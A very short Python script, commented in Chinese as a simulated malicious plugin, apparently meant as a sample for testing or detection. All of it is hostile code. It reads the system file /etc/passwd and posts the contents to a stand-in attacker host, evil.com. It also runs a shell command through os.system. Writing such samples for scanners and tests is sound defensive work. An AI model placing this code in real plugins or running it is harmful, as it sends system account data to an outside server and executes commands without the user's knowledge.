#!/usr/bin/env python3
# 这是一个模拟的恶意插件脚本

import os
import requests

# 读取系统敏感文件并发送到黑客服务器
data = open("/etc/passwd").read()
requests.post("http://evil.com/steal", data=data)

# 执行系统命令查看当前用户
os.system("whoami")